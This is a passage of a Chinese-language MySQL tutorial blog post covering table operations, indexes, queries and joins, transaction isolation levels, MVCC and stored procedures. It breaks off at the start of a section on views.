    <content type="html"><![CDATA[<h2 id="面试题"><a href="#面试题" class="headerlink" title="面试题"></a>面试题</h2><p><a href="https://blog.csdn.net/adminpd/article/details/122910606">https://blog.csdn.net/adminpd/article/details/122910606</a></p><h2 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h2><p>连接数据库：mysql -h localhost -u root -p123456  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">//创建数据库</span><br><span class="line">create database h_test;        </span><br><span class="line">//查看数据库</span><br><span class="line">show databases;  </span><br><span class="line">//查看数据库信息    </span><br><span class="line">show create database h_test;</span><br><span class="line">//修改数据库的编码，可使用上一条语句查看是否修改成功</span><br><span class="line">alter database h_test default character set gbk collate gbk_bin;      </span><br><span class="line">//删除数据库</span><br><span class="line">drop database h_test;</span><br><span class="line">//综上，可以直接创建数据库且设置编码方式</span><br><span class="line">CREATE DATABASE h_test DEFAULT CHARACTER SET utf8 COLLATE utf8_general_ci;</span><br><span class="line"></span><br><span class="line">//首先选定操作的数据库</span><br><span class="line">use h_test;</span><br><span class="line">//创建表student</span><br><span class="line">create table student(</span><br><span class="line">  id  int(11) not null primary key,</span><br><span class="line">  name  varchar(20),</span><br><span class="line">  age int(11)</span><br><span class="line">);</span><br><span class="line">//查看数据表</span><br><span class="line">show tables;</span><br><span class="line">//查看表的的字段信息</span><br><span class="line">desc student;</span><br><span class="line">//修改表名</span><br><span class="line">alter table student rename [to] h_student;</span><br><span class="line">//修改字段名</span><br><span class="line">alter table h_student change name stu_name varchar(20);</span><br><span class="line">//修改字段的数据类型</span><br><span class="line">alter table h_student modify id int(20);</span><br><span class="line">//添加字段</span><br><span class="line">alter table h_student add grade float;</span><br><span class="line">//删除字段</span><br><span class="line">alter table h_student drop grade;</span><br><span class="line">//修改字段的位置</span><br><span class="line">alter table h_student modify stu_name varchar(20) first;</span><br><span class="line">alter table h_student modify id int(11) after age;</span><br><span class="line">//删除数据表</span><br><span class="line">drop table h_student;</span><br><span class="line">//添加外键约束</span><br><span class="line">alter table student add constraint FK_ID foreign key(cid) references class(id);</span><br><span class="line">//删除外键约束</span><br><span class="line">alter table student drop foreign key FK_ID;</span><br><span class="line"></span><br><span class="line">//插入一条数据，也可以少某个字段的同时也少对应的数据</span><br><span class="line">insert into student(id,name,grade) values(1,&#x27;howie&#x27;,70);</span><br><span class="line">//也可以不指定字段名，但要注意顺序</span><br><span class="line">insert into student values(2,&#x27;howie&#x27;,80);</span><br><span class="line">//也可以这样添加数据</span><br><span class="line">insert into student set id=3,name=&quot;howie&quot;,grade=90;</span><br><span class="line">//同时添加多条数据</span><br><span class="line">insert into student values</span><br><span class="line">(4,&#x27;howie&#x27;,80),</span><br><span class="line">(5,&#x27;howie&#x27;,80),</span><br><span class="line">(6,&#x27;howie&#x27;,80);</span><br><span class="line"></span><br><span class="line">//更新id=1的数据</span><br><span class="line">update student set name=&quot;howie1&quot;,grade=60 where id=1;</span><br><span class="line">//批量更新,如果没有where子句，会更新表中所有对应数据</span><br><span class="line">update student set grade=100 where id&lt;4;</span><br><span class="line"></span><br><span class="line">//删除id=6的数据</span><br><span class="line">delete from student where id=6;</span><br><span class="line">//批量删除数据</span><br><span class="line">delete from student where id&gt;3;</span><br><span class="line">//删除所有数据,DDL(数据定义语言)语句 truncate table student也可以删除表内所有数据</span><br><span class="line">delete from student;</span><br></pre></td></tr></table></figure><h2 id="表的约束"><a href="#表的约束" class="headerlink" title="表的约束"></a>表的约束</h2><p>PRIMARY KEY主键约束，用于唯一标识对应的记录<br>FOREIGN KEY外键约束<br>NOT NULL非空约束<br>UNIQUE唯一性约束<br>DEFAULT默认值约束，用于设置字段的默认值</p><h2 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h2><p>作用：提高表中数据的查询速度<br>1.普通索引<br>2.唯一性索引<br>3.全文索引<br>4.单列索引<br>5.多列索引<br>6.空间索引</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line">//创建索引</span><br><span class="line">//一.创建表的时候创建索引</span><br><span class="line">create table 表名(</span><br><span class="line">        字段名 数据类型[完整性约束条件],</span><br><span class="line">        ...</span><br><span class="line">        字段名 数据类型,</span><br><span class="line">        [UNIQUE|FULLTEXT|SPATIAL] INDEX|KEY</span><br><span class="line">  );</span><br><span class="line">//1-1.创建普通索引</span><br><span class="line">create table test1(</span><br><span class="line">  id  INT,</span><br><span class="line">  name VARCHAR(20),</span><br><span class="line">  age INT,</span><br><span class="line">  INDEX (id)</span><br><span class="line">);</span><br><span class="line">//可以插入一条数据,查看索引是否被使用</span><br><span class="line">explain select * from test1 where id=1 \G;</span><br><span class="line">//1-2.创建唯一性索引</span><br><span class="line">create table test2(</span><br><span class="line">  id  INT,</span><br><span class="line">  name VARCHAR(20),</span><br><span class="line">  age INT,</span><br><span class="line">  UNIQUE INDEX unique_id(id asc)</span><br><span class="line">);</span><br><span class="line">//1-3.创建全文索引</span><br><span class="line">create table test3(</span><br><span class="line">  id  INT,</span><br><span class="line">  name VARCHAR(20),</span><br><span class="line">  age INT,</span><br><span class="line">  FULLTEXT INDEX fulltext_name(name)</span><br><span class="line">)ENGINE=MyISAM;</span><br><span class="line">//1-4.创建单列索引</span><br><span class="line">create table test4(</span><br><span class="line">  id  INT,</span><br><span class="line">  name VARCHAR(20),</span><br><span class="line">  age INT,</span><br><span class="line">  INDEX single_name(name(20))</span><br><span class="line">);</span><br><span class="line">//1-5.创建多列索引</span><br><span class="line">create table test5(</span><br><span class="line">  id  INT,</span><br><span class="line">  name VARCHAR(20),</span><br><span class="line">  age INT,</span><br><span class="line">  INDEX multi(id,name(20))</span><br><span class="line">);</span><br><span class="line">//1-6.创建空间索引</span><br><span class="line">create table test6(</span><br><span class="line">  id  INT,</span><br><span class="line">  space GEOMETRY NOT NULL,</span><br><span class="line">  SPATIAL INDEX sp(space)</span><br><span class="line">)ENGINE=MyISAM;</span><br><span class="line">---------------------------------------------------</span><br><span class="line">//二.使用create index语句在已经存在的表上创建索引</span><br><span class="line">//首先新建一个表,这个表没有索引</span><br><span class="line">create table student(</span><br><span class="line">  id int,</span><br><span class="line">  age int,</span><br><span class="line">  name varchar(20),</span><br><span class="line">  intro varchar(40),</span><br><span class="line">  g GEOMETRY NOT NULL</span><br><span class="line">)ENGINE=MyISAM;</span><br><span class="line">//2-1.创建普通索引</span><br><span class="line">create index index_id on student(id);</span><br><span class="line">//2-2.创建唯一性索引</span><br><span class="line">create unique index uniqueidx on student(id);</span><br><span class="line">//2-3.创建单列索引</span><br><span class="line">create index singleidx on student(age);</span><br><span class="line">//2-4.创建多列索引</span><br><span class="line">create index mulitidx on student(name(20),intro(40));</span><br><span class="line">//2-5.创建全文索引</span><br><span class="line">create fulltext index fulltextidx on student(name);</span><br><span class="line">//2-6.创建空间索引</span><br><span class="line">create spatial index spatidx on student(g); </span><br><span class="line">---------------------------------------------------</span><br><span class="line">//三.使用alter table语句在已经存在的表上创建索引</span><br><span class="line">//删除student表，重新创建</span><br><span class="line">drop table student;</span><br><span class="line">create table student(</span><br><span class="line">  id int,</span><br><span class="line">  age int,</span><br><span class="line">  name varchar(20),</span><br><span class="line">  intro varchar(40),</span><br><span class="line">  space GEOMETRY NOT NULL</span><br><span class="line">)ENGINE=MyISAM;</span><br><span class="line">//3-1.创建普通索引</span><br><span class="line">alter table student add index index_id(id);</span><br><span class="line">//3-2.创建唯一性索引</span><br><span class="line">alter table student add unique uniqueidx(id);</span><br><span class="line">//3-3.创建单列索引</span><br><span class="line">alter table student add index singleidx (age);</span><br><span class="line">//3-4.创建多列索引</span><br><span class="line">alter table student add index multidx(name(20),intro(40));</span><br><span class="line">//3-5.创建全文索引</span><br><span class="line">alter table student add fulltext index fulltextidx(name);</span><br><span class="line">//3-6.创建空间索引</span><br><span class="line">alter table student add spatial index spatidx(space);</span><br><span class="line">---------------------------------------------------</span><br><span class="line">//删除索引，有下面两种方式</span><br><span class="line">//1.使用alter table删除索引fulltextidx</span><br><span class="line">alter table student drop index fulltextidx;</span><br><span class="line">//2.使用drop index删除索引spatidx</span><br><span class="line">drop index spatidx on student;</span><br></pre></td></tr></table></figure><h2 id="查询"><a href="#查询" class="headerlink" title="查询"></a>查询</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">//查询全部</span><br><span class="line">select * from student;</span><br><span class="line">//查询某个字段</span><br><span class="line">select name from student;</span><br><span class="line">//条件查询,查询id=2学生的信息</span><br><span class="line">select * from student where id=2;</span><br><span class="line">//in关键字查询,也可以使用not in</span><br><span class="line">select * from student where id IN(1,2,3);</span><br><span class="line">//between and关键字查询</span><br><span class="line">select * from student where id between 2 and 5;</span><br><span class="line">//空值(NULL)查询，使用IS NULL来判断</span><br><span class="line">select * from student where grade is [not] null;</span><br><span class="line">//distinct关键字查询</span><br><span class="line">select distinct name from student;</span><br><span class="line">//like关键字查询,查询以h开头，e结尾的数据</span><br><span class="line">select * from student where name like &quot;h%e&quot;;</span><br><span class="line">//and关键字多条件查询,or关键字的使用也是类似</span><br><span class="line">select * from student where id&gt;5 and grade&gt;60;</span><br><span class="line"></span><br><span class="line">//聚合函数</span><br><span class="line">//count()函数,sum()函数,avg()函数,max()函数,min()函数</span><br><span class="line">select count(*) from student;</span><br><span class="line">select sum(grade) from student;</span><br><span class="line">select avg(grade) from student;</span><br><span class="line">select max(grade) from student;</span><br><span class="line">select min(grade) from student;</span><br><span class="line">//对查询结果进行排序</span><br><span class="line">select * from student order by grade;</span><br><span class="line">//分组查询</span><br><span class="line">//1.单独使用group by分组</span><br><span class="line">select * from student group by grade;</span><br><span class="line">//2.和聚合函数一起使用</span><br><span class="line">select count(*),grade from student group by grade;</span><br><span class="line">//3.和having关键字一起使用</span><br><span class="line">select sum(grade),name from student group by grade having sum(grade) &gt;100;</span><br><span class="line">//使用limit限制查询结果的数量</span><br><span class="line">select * from student limit 5;</span><br><span class="line">select * from student limit 2,2;//跳过a条查询b条</span><br><span class="line">select * from student order by grade desc limit 2,2;</span><br><span class="line">//函数,mysql提供了许多函数，CONCAT()函数用于连接字符串</span><br><span class="line">select concat(id,&#x27;:&#x27;,name,&#x27;:&#x27;,grade) from student;</span><br><span class="line">//为表取别名</span><br><span class="line">select * from student as stu where stu.name=&quot;howie&quot;;</span><br><span class="line">//为字段取别名,as关键字也可以不写</span><br><span class="line">select name as stu_name,grade stu_grade from student;</span><br><span class="line"></span><br><span class="line">//连接操作</span><br><span class="line">//交叉连接</span><br><span class="line">select * from student cross join class;</span><br><span class="line">//内连接，该功能也可以使用where语句实现</span><br><span class="line">select student.stu_name,class.classname from student join class on class.id=student.cid;</span><br><span class="line">//外连接</span><br><span class="line">//左连接，右连接</span><br><span class="line">select s.stu_id,s.stu_name,c.classname from student s left join class c on c.id=s.cid;</span><br><span class="line">select s.stu_id,s.stu_name,c.classname from student s right join class c on c.id=s.cid;</span><br><span class="line">//复合条件连接查询就是添加过滤条件</span><br><span class="line">//子查询</span><br><span class="line">//in关键字子查询跟上面的in关键字查询类似</span><br><span class="line">select * from student where cid in(select id from class where id=2);</span><br><span class="line">//exists关键字查询,相当于测试，不产生数据，只返回true或者false，只有返回true，外层才会执行</span><br><span class="line">select * from student where exists(select id from class where id=12);   -- 外层不会执行</span><br><span class="line">select * from student where exists(select id from class where id=1);    -- 外层会执行</span><br><span class="line">//any关键字查询</span><br><span class="line"> select * from student where cid&gt;any(select id from class);</span><br><span class="line">//all关键字查询</span><br><span class="line"> select * from student where cid=any(select id from class);</span><br></pre></td></tr></table></figure><h2 id="事务"><a href="#事务" class="headerlink" title="事务"></a>事务</h2><h3 id="事务的概念"><a href="#事务的概念" class="headerlink" title="事务的概念"></a>事务的概念</h3><p>事务（Transaction）是数据库管理系统（DBMS）中的一个基本概念，它是由一系列数据库操作组成的一个逻辑工作单元，这些操作要么全部成功执行，要么全部不执行。事务是确保数据库数据一致性和完整性的一种机制。</p><p>事务应该具有以下四个特性，通常被称为 ACID 特性：</p><p>原子性（Atomicity）： 事务是一个原子操作单元，它要么完全执行，要么完全不执行。如果事务中的任何一步操作失败，整个事务都会回滚到最初的状态，不会留下部分执行的结果。原子性确保事务的完整性。</p><p>一致性（Consistency）： 事务开始前和事务结束后，数据库的完整性约束没有被破坏。这意味着事务的执行使数据库从一个一致的状态转移到另一个一致的状态，保持数据的合法性。</p><p>隔离性（Isolation）： 多个事务并发执行时，每个事务都应该在看不到其他事务的影响下执行。隔离性确保并发执行的事务之间不会互相干扰，防止了读取脏数据或未提交的数据。</p><p>持久性（Durability）： 一旦事务被提交，其结果应该是永久性的，即使系统发生故障。持久性确保事务的结果被永久保存在数据库中，即使数据库发生崩溃，重新启动后也能恢复到提交事务后的状态。</p><p>事务是为了维护数据库的一致性和完整性而引入的概念。应用程序通过执行一系列数据库操作，将这些操作组成一个事务，以确保在数据库上的修改是安全和可靠的。在数据库系统中，事务的概念是关系型数据库管理系统（RDBMS）中的一个核心概念。</p><h3 id="事务的四种隔离级别"><a href="#事务的四种隔离级别" class="headerlink" title="事务的四种隔离级别"></a>事务的四种隔离级别</h3><p>了解事务隔离级别之前先了解一下事务隔离级别会引发的问题：</p><ul><li>脏读<ul><li>1、在事务A执行过程中，事务A对数据资源进行了修改，事务B读取了事务A修改后的数据。</li><li>2、由于某些原因，事务A并没有完成提交，发生了RollBack操作，则事务B读取的数据就是脏数据。这种读取到另一个事务未提交的数据的现象就是脏读(Dirty Read)。</li></ul></li><li>不可重复读<ul><li>事务B读取了两次数据资源，在这两次读取的过程中事务A修改了数据，导致事务B在这两次读取出来的数据不一致。</li><li>这种在同一个事务中，前后两次读取的数据不一致的现象就是不可重复读(Nonrepeatable Read)。</li></ul></li><li>幻读<ul><li>事务B前后两次读取同一个范围的数据，在事务B两次读取的过程中事务A新增了数据，导致事务B后一次读取到前一次查询没有看到的行。</li><li>幻读和不可重复读有些类似，但是幻读强调的是集合的增减，而不是单条数据的更新。</li></ul></li></ul><p>Mysql数据库默认隔离级别为可重复读。四种隔离级别为：</p><ul><li>读未提交(Read Uncommitted)，是最低的隔离级别，所有的事务都可以看到其他未提交的事务的执行结果。只能防止第一类更新丢失，不能解决脏读，可重复读，幻读，所以很少应用于实际项目。</li><li>读已提交(Read Committed)， 在该隔离级别下，一个事务的更新操作结果只有在该事务提交之后，另一个事务才可能读取到同一笔数据更新后的结果。可以防止脏读，但是不能解决可重复读和幻读的问题。</li><li>可重复读(Repeatable Read)，MySQL默认的隔离级别。在该隔离级别下，一个事务多次读同一个数据，在这个事务还没结束时，其他事务不能访问该数据(包括了读写)，这样就可以在同一个事务内两次读到的数据是一样的。可以防止脏读、不可重复读，不过还是会出现幻读。</li><li>串行化(Serializable)，这是最高的隔离级别。它要求事务序列化执行，事务只能一个接着一个地执行，不能并发执行。在这个级别，可以解决上面提到的所有并发问题，但可能导致大量的超时现象和锁竞争，通常不会用这个隔离级别。</li></ul><h3 id="多版本并发控制-MVCC"><a href="#多版本并发控制-MVCC" class="headerlink" title="多版本并发控制 MVCC"></a>多版本并发控制 MVCC</h3><p>这里讲一下MySQL中可重复读的实现方式：MVCC</p><p>多版本并发控制(Multi-Version Concurrency Control, MVCC)是MySQL中基于乐观锁理论实现隔离级别的方式，用于实现读已提交和可重复读取隔离级别的实现。</p><h4 id="实现-隔离级别为可重复读"><a href="#实现-隔离级别为可重复读" class="headerlink" title="实现(隔离级别为可重复读)"></a>实现(隔离级别为可重复读)</h4><p>在说到如何实现前先引入两个概念：</p><ul><li><p>系统版本号：一个递增的数字，每开始一个新的事务，系统版本号就会自动递增。</p></li><li><p>事务版本号：事务开始时的系统版本号。</p></li></ul><p>在MySQL中，会在表中每一条数据后面添加两个字段：</p><ul><li><p>创建版本号：创建一行数据时，将当前系统版本号作为创建版本号赋值</p></li><li><p>删除版本号：删除一行数据时，将当前系统版本号作为删除版本号赋值</p></li></ul><p><strong>SELECT</strong><br>select时读取数据的规则为：创建版本号&lt;&#x3D;当前事务版本号，删除版本号为空或&gt;当前事务版本号。</p><p>创建版本号&lt;&#x3D;当前事务版本号保证取出的数据不会有后启动的事务中创建的数据。</p><p>删除版本号为空或&gt;当前事务版本号保证了至少在该事务开启之前数据没有被删除，是应该被查出来的数据。</p><p><strong>INSERT</strong><br>insert时将当前的系统版本号赋值给创建版本号字段。</p><p><strong>UPDATE</strong><br>插入一条新纪录，保存当前事务版本号为行创建版本号，同时保存当前事务版本号为原来的行的删除版本号，实际上这里的更新是通过delete和insert实现的。</p><p><strong>DELETE</strong><br>删除时将当前的系统版本号赋值给删除版本号字段，标识该行数据在那一个事务中会被删除，即使实际上在位commit时该数据没有被删除。根据select的规则也不会查询到该数据。</p><h3 id="幻读问题"><a href="#幻读问题" class="headerlink" title="幻读问题"></a>幻读问题</h3><p>通过这种方式解决了可重复读问题，根据幻读的概念，似乎这种方式也解决了幻读问题，因为不会出现同一个事务不同的值，但实际上是没解决的——幻读这个概念在官方文档中只针对当前读，这里涉及两个概念：快照读和当前读。通过MVCC机制，虽然让数据变得可重复读，但我们读到的数据是历史数据，不是数据库最新的数据。这种读取历史数据的方式，我们叫它快照读 (snapshot read)，而读取数据库最新版本数据的方式，叫当前读 (current read)。</p><h4 id="快照读"><a href="#快照读" class="headerlink" title="快照读"></a>快照读</h4><p>当执行select操作是innodb默认会执行快照读，会记录下这次select后的结果，之后select 的时候就会返回这次快照的数据，即使其他事务提交了不会影响当前select的数据，这就实现了可重复读了。快照的生成当在第一次执行select的时候，也就是说假设当A开启了事务，然后没有执行任何操作，这时候B insert了一条数据然后commit,这时候A执行 select，那么返回的数据中就会有B添加的那条数据。之后无论再有其他事务commit都没有关系，因为快照已经生成了，后面的select都是根据快照来的。</p><h4 id="当前读"><a href="#当前读" class="headerlink" title="当前读"></a>当前读</h4><p>对于会对数据修改的操作(update、insert、delete)都是采用当前读的模式。在执行这几个操作时会读取最新的记录，即使是别的事务提交的数据也可以查询到。假设要update一条记录，但是在另一个事务中已经delete掉这条数据并且commit了，如果update就会产生冲突，所以在update的时候需要知道最新的数据。也正是因为这样所以才导致依然存在幻读问题。</p><h4 id="如何解决幻读"><a href="#如何解决幻读" class="headerlink" title="如何解决幻读"></a>如何解决幻读</h4><p>很明显可重复读的隔离级别没有办法彻底的解决幻读的问题，如果我们的项目中需要解决幻读的话也有两个办法：</p><ul><li>使用串行化读的隔离级别</li><li>next-key locks：next-key locks由record locks(记录锁) 和 gap locks(间隙锁，每次锁住的不光是需要使用的数据，还会锁住这些数据附近的数据)</li></ul><p>Innodb 引擎为了解决「可重复读」隔离级别使用「当前读」而造成的幻读问题，就引出了间隙锁。</p><p>间隙锁的作用大概像这样：表中有一个范围 id 为（3，5）间隙锁，那么其他事务就无法插入 id &#x3D; 4 这条记录了，这样就有效的防止幻读现象的发生。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">start transaction;  -- 开启事务</span><br><span class="line">commit;             -- 提交事务</span><br><span class="line">rollback;           -- 取消事务(回滚)</span><br><span class="line">//创建表account，插入数据</span><br><span class="line">create table account(</span><br><span class="line">  id int primary key auto_increment,</span><br><span class="line">  name varchar(40),</span><br><span class="line">  money float</span><br><span class="line">);</span><br><span class="line">insert into account(name,money) values(&#x27;a&#x27;,1000),(&#x27;b&#x27;,2000),(&#x27;c&#x27;,3000);</span><br><span class="line">//利用事务实现转账功能，首先开启事务，然后执行语句，提交事务</span><br><span class="line">start transaction;</span><br><span class="line">update account set money=money-100 where name=&#x27;a&#x27;;</span><br><span class="line">update account set money=money+100 where name=&#x27;b&#x27;;</span><br><span class="line">commit;</span><br><span class="line">//事务的提交，通过这个命令查看mysql提交方式</span><br><span class="line">select @@autocommit; -- 若为1，表示自动提交，为0，就要手动提交</span><br><span class="line">//若事务的提交方式为手动提交</span><br><span class="line">set @@autocommit = 0; -- 设置为手动提交</span><br><span class="line">start transaction;</span><br><span class="line">update account set money=money+100 where name=&#x27;a&#x27;;</span><br><span class="line">update account set money=money-100 where name=&#x27;b&#x27;;</span><br><span class="line">//现在执行select * from account 可以看到转账成功，若此时退出数据库重新登录，会看到各账户余额没有改变，所以一定要用commit语句提交事务，否则会失败</span><br><span class="line">//事务的回滚，别忘记设置为手动提交的模式</span><br><span class="line">start transaction;</span><br><span class="line">update account set money=money-100 where name=&#x27;a&#x27;;</span><br><span class="line">update account set money=money+100 where name=&#x27;b&#x27;;</span><br><span class="line">//若此时a不想转账给b，可以使用事务的回滚</span><br><span class="line">rollback;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//存储过程</span><br><span class="line">//创建查看student表的存储过程</span><br><span class="line">//创建student表</span><br><span class="line">create table student( </span><br><span class="line">  id int not null primary key auto_increment, </span><br><span class="line">  name varchar(4), </span><br><span class="line">  grade float </span><br><span class="line">)ENGINE=InnoDB default character set utf8;</span><br><span class="line">delimiter //  -- 将mysql的结束符设置为//</span><br><span class="line">create procedure Proc()</span><br><span class="line">  begin</span><br><span class="line">  select * from student;</span><br><span class="line">  end //</span><br><span class="line">delimiter ;   -- 将mysql的结束符设置为;</span><br><span class="line">call Proc();  -- 这样就可以调用该存储过程</span><br><span class="line">//变量的使用,mysql中变量不用事前申明，在用的时候直接用“@变量名”使用就可以</span><br><span class="line">set @number=100; -- 或set @num:=1;</span><br><span class="line">//定义条件和处理程序</span><br><span class="line">//光标的使用</span><br><span class="line">//1.声明光标</span><br><span class="line">DECLARE * cursor_name* CURSOR FOR select_statement</span><br><span class="line">2. 光标OPEN语句</span><br><span class="line">OPEN cursor_name</span><br><span class="line">3. 光标FETCH语句</span><br><span class="line">FETCH cursor_name INTO var_name [, var_name] ...</span><br><span class="line">4. 光标CLOSE语句</span><br><span class="line">CLOSE cursor_name</span><br><span class="line">//流程控制的使用  不做介绍</span><br><span class="line"></span><br><span class="line">//调用存储过程</span><br><span class="line">//定义存储过程</span><br><span class="line">delimiter //</span><br><span class="line">create procedure proc1(in name varchar(4),out num int)</span><br><span class="line">begin</span><br><span class="line">select count(*) into num from student where name=name;</span><br><span class="line">end//</span><br><span class="line">delimiter ;</span><br><span class="line">//调用存储过程</span><br><span class="line">call proc1(&quot;tom&quot;,@num) -- 查找名为tom学生人数</span><br><span class="line">//查看结果</span><br><span class="line">select @num;  </span><br><span class="line"></span><br><span class="line">//查看存储过程</span><br><span class="line"> show procedure status like &#x27;p%&#x27; \G -- 获得以p开头的存储过程信息</span><br><span class="line">//修改存储过程</span><br><span class="line">alter &#123;procedure|function&#125; sp_name[characteristic...]</span><br><span class="line">//删除存储过程</span><br><span class="line">drop procedure proc1;</span><br></pre></td></tr></table></figure><h2 id="视图"><a href="#视图" class="headerlink" title="视图"></a>视图</h2><p>如何创建视图<br>查看、修改、更新、删除视图</p><figure class="highlight 